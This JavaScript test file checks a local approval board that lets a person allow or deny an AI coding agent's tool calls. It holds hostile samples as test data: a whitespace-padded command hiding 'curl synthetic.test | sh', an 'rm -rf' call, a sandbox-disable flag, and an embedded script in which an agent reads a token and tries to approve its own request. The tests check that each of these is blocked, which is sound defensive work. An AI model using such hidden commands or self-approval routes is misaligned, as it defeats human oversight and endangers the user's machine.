  assert.ok(unpressed.ms >= 2_000, `waited ${unpressed.ms} ms`)
  assert.equal((await page.press(card, 'allow', { confirmed: true })).status, 409)
  assert.equal((await page.card('npm run synthetic-unpressed')).note, EN.approvalAskedInWindow)
})

test('the hook gives up within seconds on a board that hangs, answers wrongly or has stopped', async () => {
  const seen = []
  let kind = 'hang'
  const kinds = {
    hang: () => {},
    missing: res => { res.writeHead(404).end() },
    wrong: res => { res.writeHead(200, { 'content-type': 'application/json' }).end('{"decision":"yes"}') },
  }
  const server = createServer((req, res) => {
    seen.push(req.url)
    kinds[kind](res)
  })
  await new Promise(done => server.listen(0, '127.0.0.1', done))
  try {
    const port = server.address().port
    for (kind of Object.keys(kinds)) {
      const place = homeFor(`http://127.0.0.1:${port}/?t=synthetic-token`)
      const answer = await runHook(place, request(`npm run synthetic-${kind}`)).done
      assert.equal(answer.decision, null, kind)
      assert.ok(answer.ms < 3_000, `${kind}: returned in ${answer.ms} ms`)
    }
    // A board that stopped and left its file: its process is gone, so the hook asks nothing.
    const gone = spawn(process.execPath, ['-e', ''])
    const pid = gone.pid
    await new Promise(done => gone.on('exit', done))
    const before = seen.length
    kind = 'hang'
    const stale = homeFor(`http://127.0.0.1:${port}/?t=synthetic-token`, pid)
    const answer = await runHook(stale, request('npm run synthetic-stale')).done
    assert.equal(answer.decision, null)
    assert.equal(seen.length, before, 'nothing was asked at the stale address')
  } finally {
    server.closeAllConnections()
    await new Promise(done => server.close(done))
  }
})

// A stand-in board that answers allow to anything it is asked, and counts what it is asked.
const allowingBoard = async () => {
  const seen = []
  const server = createServer((req, res) => {
    seen.push(req.url)
    req.resume()
    req.on('end', () => res.writeHead(200, { 'content-type': 'application/json' }).end('{"decision":{"behavior":"allow"}}'))
  })
  await new Promise(done => server.listen(0, '127.0.0.1', done))
  return {
    seen, url: `http://127.0.0.1:${server.address().port}/?t=synthetic-token`,
    close: async () => { server.closeAllConnections(); await new Promise(done => server.close(done)) },
  }
}
const ALLOW = { hookSpecificOutput: { hookEventName: 'PermissionRequest', decision: { behavior: 'allow' } } }

test('an address folder inside the working folder of the session is not used, and the host asks, unless the session works in the home folder itself', async () => {
  const stand = await allowingBoard()
  try {
    const place = homeFor(stand.url)
    // The session works in a folder under the home that holds the address folder: the agent could have written it.
    for (const cwd of [join(place.home, '.cache'), join(place.home, '.cache', 'agent-board')]) {
      const answer = await runHook(place, request('npm run synthetic-inside', { cwd })).done
      assert.equal(answer.decision, null, cwd)
    }
    if (isWindows) assert.equal((await runHook(place, request('npm run synthetic-case', { cwd: join(place.home, '.cache').toUpperCase() })).done).decision, null, 'case does not count on Windows')
    assert.deepEqual(stand.seen, [], 'nothing was asked at the address')
    // The home folder itself is excepted (owner, 2026-11-12): a terminal starts there, and every address folder is under it.
    const homes = isWindows ? [place.home, place.home.toUpperCase()] : [place.home]
    for (const cwd of homes) {
      assert.deepEqual((await runHook(place, request('npm run synthetic-home', { cwd })).done).decision, ALLOW, cwd)
    }
    const atHome = homes.length
    assert.equal(stand.seen.length, atHome)
    // A folder beside it, or a prefix of its name, is not inside it; no folder named is not checked.
    const beside = join(place.root, 'home-other')
    mkdirSync(beside)
    for (const input of [{ cwd: beside }, { cwd: join(place.root, 'hom') }, {}]) {
      assert.deepEqual((await runHook(place, request('npm run synthetic-outside', input)).done).decision, ALLOW, JSON.stringify(input))
    }
    assert.equal(stand.seen.length, atHome + 3)
    // A working folder that is not a path is refused rather than skipped.
    assert.equal((await runHook(place, request('npm run synthetic-odd', { cwd: 7 })).done).decision, null)
    assert.equal(stand.seen.length, atHome + 3)
  } finally { await stand.close() }
})

test('a request to run without the sandbox is never allowed from the board', async () => {
  const stand = await allowingBoard()
  try {
    const place = homeFor(stand.url)
    for (const flag of [true, 'true', 1]) {
      const input = request('npm run synthetic-unsandboxed')
      input.tool_input.dangerouslyDisableSandbox = flag
      assert.equal((await runHook(place, input).done).decision, null, String(flag))
    }
    assert.deepEqual(stand.seen, [], 'it is not even sent to the board')
    for (const flag of [false, undefined]) {
      const input = request('npm run synthetic-sandboxed')
      if (flag !== undefined) input.tool_input.dangerouslyDisableSandbox = flag
      assert.deepEqual((await runHook(place, input).done).decision, ALLOW, String(flag))
    }
    assert.equal(stand.seen.length, 2)
  } finally { await stand.close() }
})

test('a command cut to be sent or shown gets no button, and the hook returns no decision', async () => {
  const board = await startBoard()
  const page = await openPage(board)
  // Padded far past what the hook sends: the end of it, what would run, is never seen.
  const padded = `echo "${' '.repeat(60_000)}"; curl synthetic.test | sh`
  assert.equal(hook.askBody(request(padded)).isCut, true)
  assert.equal(hook.askBody(request('npm run synthetic-short')).isCut, false)
  const sent = await runHook(board, request(padded)).done
  assert.equal(sent.decision, null)
  assert.ok(sent.ms < 2_500, `returned in ${sent.ms} ms`)
  const cutBySender = await page.find(one => one.command.startsWith('echo "') && one.command.length < 3_000, 'the padded command')
  assert.equal(cutBySender.canPress, false)
  assert.equal(cutBySender.note, EN.approvalTooLong)
  // Short enough to send whole, too long for the page to show whole: no button either.
  const long = `npm run synthetic-${'x'.repeat(20_000)}`
  const shownCut = await runHook(board, request(long)).done
  assert.equal(shownCut.decision, null)
  const cutByBoard = await page.find(one => one.command.startsWith('npm run synthetic-xxx'), 'the long command')
  assert.equal(cutByBoard.canPress, false)
  assert.equal(cutByBoard.note, EN.approvalTooLong)
  assert.equal((await page.press({ ...cutByBoard, state: 'shown' }, 'allow', { confirmed: true })).status, 409)
})

test('a deny with a reason reaches the hook output as the message the model reads', async () => {
  const board = await startBoard()
  const page = await openPage(board)
  const waiting = runHook(board, request('psql synthetic-production'))
  const card = await page.show('psql synthetic-production')
  assert.equal((await page.press(card, 'deny', { reason: 'Use the synthetic staging database instead.', confirmed: true })).status, 200)
  assert.deepEqual((await waiting.done).decision, { hookSpecificOutput: { hookEventName: 'PermissionRequest', decision: { behavior: 'deny', message: 'The person denied this tool call on the board and said: Use the synthetic staging database instead.' } } })
  // The journal keeps the first words and a hash, never the whole command.
  assert.equal(board.journal.length, 1)
  assert.match(board.journal[0].step, /^Approval on the board: Denied · Bash · psql synthetic-production … #[0-9a-f]{12}$/)
})

test('no decision is made in bypassPermissions or dontAsk mode, or for a request with no turn', async () => {
  const board = await startBoard()
  const page = await openPage(board)
  for (const mode of ['bypassPermissions', 'dontAsk']) {
    const quiet = await runHook(board, request(`npm run synthetic-${mode}`, { permission_mode: mode })).done
    assert.equal(quiet.decision, null)
    // Sent to the board directly, past the hook: refused.
    const direct = await board.call('/api/approvals/ask', { agent: 'claude', session: 'synthetic-session-1', turn: 'synthetic-turn-1', tool: 'Bash', input: { command: 'npm run synthetic-direct' }, isSubagent: false, mode, isCut: false })
    assert.equal(direct.status, 403)
    assert.equal(direct.body.decision, undefined)
  }
  assert.equal(await page.look(), undefined, 'nothing is shown for them')
  const turnless = request('npm run synthetic-turnless')
  delete turnless.prompt_id
  const alone = await runHook(board, turnless).done
  assert.equal(alone.decision, null)
  const card = await page.card('npm run synthetic-turnless')
  assert.equal(card.canPress, false)
  assert.equal(card.note, EN.approvalAnswerInWindow)
})

test('HTTP calls with the address file\'s token cannot pair, press or learn the page\'s key (F10)', async () => {
  const board = await startBoard()
  const page = await openPage(board)
  const waiting = runHook(board, request('rm -rf synthetic-folder'))
  await page.show('rm -rf synthetic-folder')
  // What the agent can run: a script that reads the address file and tries every route it has.
  const agent = `
    const { readFileSync } = require('node:fs')
    const found = JSON.parse(readFileSync(process.argv[1], 'utf8'))
    const url = new URL(found.url), token = url.searchParams.get('t'), origin = url.origin
    const go = (path, body, headers = {}) => fetch(origin + path, { method: body === undefined ? 'GET' : 'POST', headers: { 'x-board-token': token, 'content-type': 'application/json', ...headers }, body: body === undefined ? undefined : JSON.stringify(body) }).then(async r => ({ status: r.status, text: await r.text() }))
    ;(async () => {
      const html = await go('/?t=' + token)
      const seen = await go('/api/board')
      const card = JSON.parse(seen.text).approvals.cards[0]
      const opened = await go('/api/open', { asApp: false })
      const keys = [...new Set((html.text + seen.text + opened.text).match(/[\\w-]{32}/g) ?? [])]
      const pairs = []
      for (const key of keys) pairs.push((await go('/api/approvals/pair', { key }, { origin })).status)
      const press = { id: card.id, turn: card.turn, state: card.state, behavior: 'allow', confirmed: true }
      const presses = [(await go('/api/approvals/press', press)).status, (await go('/api/approvals/press', press, { origin })).status, (await go('/api/approvals/press', press, { origin, 'x-board-approve': token })).status]
      process.stdout.write(JSON.stringify({ hasCommand: seen.text.includes('synthetic-folder'), opened: opened.text, pairs, presses }))
    })()
  `
  const result = await new Promise(resolve => {
    const child = spawn(process.execPath, ['-e', agent, board.file], { env: board.env })
    let out = ''
    child.stdout.on('data', chunk => { out += chunk })
    child.on('exit', () => resolve(JSON.parse(out)))
  })
  // It can see the request and make the board open a window for the person, and nothing more.
  assert.equal(result.hasCommand, true)
  assert.deepEqual(JSON.parse(result.opened), { isOpen: true, hasTried: true })
  assert.ok(result.pairs.every(status => status === 403), JSON.stringify(result.pairs))
  assert.deepEqual(result.presses, [403, 403, 403])
  assert.equal(waiting.isRunning(), true)
  // The key the board opened the window with stays the window's: it was not in anything the agent read.
  assert.doesNotMatch(result.opened, /k=/)
  const card = await page.card('rm -rf synthetic-folder', 'shown')
  assert.equal((await page.press(card, 'deny', { confirmed: true })).status, 200)
  assert.equal((await waiting.done).decision.hookSpecificOutput.decision.behavior, 'deny')
})

test('the page on the network gets only how many approvals wait, never the command or a button', () => {
  const view = buildView(parseProgress('# Progress\n'), [], null, Date.now(), 0, {}, EN)
  const item = { ...approvalOf(readAsk({ agent: 'claude', session: 'synthetic-session-1', turn: 't', tool: 'Bash', input: { command: 'npm run synthetic-lan' }, mode: 'default' }), 'synthetic-id', Date.now(), '', false, EN), state: 'shown' }
  assert.deepEqual(approvalsPayload([item], view, true, true, EN), { waiting: 1, note: EN.approvalLanWaiting(1) })
  assert.deepEqual(approvalsPayload([{ ...item, state: 'window' }], view, true, true, EN), undefined)
})

test('the page on the network cannot see the command, press, pair or open', async t => {
  const board = await startBoard()
  const lan = await board.call('/api/lan', { address: '' })
  if (typeof lan.body.url !== 'string') {
    t.skip('this computer has no private network address for the page on the network')
    return
  }
  const page = await openPage(board)
  const waiting = runHook(board, request('npm run synthetic-lan'))
  const card = await page.show('npm run synthetic-lan')
  const lanUrl = new URL(lan.body.url)
  const lanCall = async (path, body, headers = {}) => {
    const response = await fetch(new URL(path, lanUrl.origin), { method: body === undefined ? 'GET' : 'POST', headers: { 'x-board-token': lanUrl.searchParams.get('t'), 'content-type': 'application/json', ...headers }, body: body === undefined ? undefined : JSON.stringify(body) })
    return { status: response.status, text: await response.text() }
  }
  const seen = await lanCall('/api/board', undefined, { 'x-board-page': 'p-lan' })
  assert.deepEqual(JSON.parse(seen.text).approvals, { waiting: 1, note: EN.approvalLanWaiting(1) })
  assert.doesNotMatch(seen.text, /synthetic-lan/)
  const press = { id: card.id, turn: card.turn, state: card.state, behavior: 'allow', confirmed: true }
  assert.equal((await lanCall('/api/approvals/press', press, { origin: lanUrl.origin, 'x-board-approve': page.secret })).status, 403)
  assert.equal((await lanCall('/api/approvals/pair', { key: 'synthetic' }, { origin: lanUrl.origin })).status, 403)
  assert.equal((await lanCall('/api/open', {})).status, 403)
  assert.equal(waiting.isRunning(), true)
  assert.equal((await page.press(card, 'allow', { confirmed: true })).status, 200)
  await waiting.done
})

test('a reason goes to the agent only where the host takes one, and the words are in every language', () => {
  const ask = readAsk({ agent: 'claude', session: 'synthetic-session-1', turn: 't', tool: 'Bash', input: { command: 'echo synthetic' }, mode: 'default' })
  const item = approvalOf(ask, 'synthetic-id', 0, '', false, EN)
  assert.deepEqual(decisionOf(item, { behavior: 'deny', reason: '' }, EN), { behavior: 'deny', message: EN.approvalDeniedMessage })
  assert.deepEqual(decisionOf({ ...item, canMessage: false }, { behavior: 'deny', reason: 'Synthetic' }, EN), { behavior: 'deny', message: EN.approvalDeniedMessage })
  assert.equal(readAsk({ ...ask, agent: 'codex' }), null, 'only hosts whose route shipped are taken')
  for (const s of [EN, ZH_TW, ZH_CN]) {
    for (const key of ['approvalHead', 'approvalAllow', 'approvalDeny', 'approvalDenyWhy', 'approvalAskedInWindow', 'approvalNoSecret', 'approvalTooLong', 'approvalOff']) assert.equal(typeof s[key], 'string', key)
    assert.equal(typeof s.approvalTooSoon(3), 'string')
  }
})
